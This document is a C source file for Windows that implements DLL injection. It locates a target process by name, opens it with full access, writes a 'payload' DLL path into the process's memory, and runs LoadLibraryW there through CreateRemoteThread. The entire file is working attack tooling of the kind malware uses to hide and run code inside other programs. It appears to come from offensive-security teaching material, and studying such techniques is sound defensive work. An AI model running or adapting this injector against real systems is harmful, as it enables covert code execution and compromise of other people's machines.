#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>

/*
* Retrieves a process handle for the process specified in `szProcessName`, outputting it to `hProcess`.
* Outputs the process' PID to `dwProcessId`.
*/
BOOL GetRemoteProcessHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {

	// According to the documentation:
	// Before calling Process32First(), set this member to sizeof(PROCESSENTRY32).
	// If swSize is not initialized, Process32First() fails.
	PROCESSENTRY32 Proc = {
		.dwSize = sizeof(PROCESSENTRY32)
	};

	HANDLE hSnapshot = NULL;

	// Take a snapshot of the currently running processes
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		printf("[!] CreateToolHelp32Snapshot failed with error: %d\n", GetLastError());
		goto _EndOfFunction;
	}

	// Retrieves information about the first process encountered in the snapshot
	if (!Process32First(hSnapshot, &Proc)) {
		printf("[!] Process32First failed with error: %d\n", GetLastError());
		goto _EndOfFunction;
	}

	do {

		WCHAR LowerName[MAX_PATH * 2];

		if (Proc.szExeFile) {
			DWORD dwSize = lstrlenW(Proc.szExeFile);
			DWORD i = 0;

			RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

			// Convert each character in Proc.szExeFile to lowercase,
			// ... saving it in LowerName
			if (dwSize < MAX_PATH * 2) {
				for (; i < dwSize; i++)
					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);
				LowerName[i++] = '\0';  // Null terminate string
			}

		}

		// Use the dot operator to extract the process name from the populated struct
		// ... if the process name matches the process we're looking for
		if (wcscmp(Proc.szExeFile, szProcessName) == 0) {
			// Extract the PID and save it
			*dwProcessId = Proc.th32ProcessID;
			// Open a handle to the process
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
				printf("[!] OpenProcess failed with error: %d\n", GetLastError());
			break;
		}

	// Retrieves info about the next process recorded in the snapshot
	// Continue looping while processes still remain in the snapshot
	} while (Process32Next(hSnapshot, &Proc));

_EndOfFunction:
	if (hSnapshot != NULL)
		CloseHandle(hSnapshot);
	if (*dwProcessId == NULL || *hProcess == NULL)
		return FALSE;
	return TRUE;

}

/*
* Injects a DLL specified by `DllName` into the process specified by the `hProcess` handle.
*/
BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) {

	BOOL bState = TRUE;
	
	LPVOID pLoadLibraryW = NULL;
	LPVOID pAddress = NULL;

	// fetch the size of DllName in bytes
	DWORD dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);
	SIZE_T lpNumberOfBytesWritten = NULL;
	HANDLE hThread = NULL;

	// Get pointer to LoadLibraryW
	pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	if (pLoadLibraryW == NULL) {
		printf("[!] GetProcAddress failed with error: %d\n", GetLastError());
		bState = FALSE;
		goto _EndOfFunction;
	}

	// Allocate memory the size of dwSizeToWrite (size of DLL name) inside the remote process, hProcess
	// Memory protection is RW
	pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("[!] VirtualAllocEx failed with error: %d\n", GetLastError());
		bState = FALSE;
		goto _EndOfFunction;
	}

	printf("[i] pAddress allocated at : 0x%p of size : %d\n", pAddress, dwSizeToWrite);
	printf("[#] Press <Enter> to write ... ");
	getchar();

	// The data being written is the DLL name `dllName`, which is of size `dwSizeToWrite`
	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite) {
		printf("[!] WriteProcessMemory failed with error: %d\n", GetLastError());
		bState = FALSE;
		goto _EndOfFunction;
	}

	printf("[!] Successfully written %d bytes\n", lpNumberOfBytesWritten);
	printf("[#] Press <Enter> to run...");
	getchar();

	printf("[!] Executing payload...\n");
	// The thread entry will be the address of LoadLibraryW
	// The DLL's name, pAddress, is passed as an argument to LoadLibrary
	hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
	if (hThread == NULL) {
		printf("[!] CreateRemoteThread failed with error: %d\n", GetLastError());
		bState = FALSE;
		goto _EndOfFunction;
	}

	printf("[#] DONE!\n");

_EndOfFunction:
	if (hThread)
		CloseHandle(hThread);
	return bState;

}

int wmain(int argc, wchar_t* argv[]) {
	
	if (argc < 3) {
		wprintf(L"[!] Usage: \"%s\" <Complete DLL Payload Path> <Process Name>\n", argv[0]);
		return -1;
	}

	HANDLE hProcess = NULL;
	DWORD dwProcessId = NULL;

	// Get handle of the remote process
	wprintf(L"[!] Finding remote process of ID \"%s\"...\n", argv[2]);
	if (!GetRemoteProcessHandle(argv[2], &dwProcessId, &hProcess)) {
		printf("[!] Process not found!");
		return -1;
	}
	wprintf(L"[+] DONE\n");

	printf("[!] Found target PID: %d\n", dwProcessId);
	// Inject DLL
	if (!InjectDllToRemoteProcess(hProcess, argv[1])) {
		return -1;
	}

	CloseHandle(hProcess);
	printf("[#] Press <Enter> to quit...");
	getchar();
	return 0;

}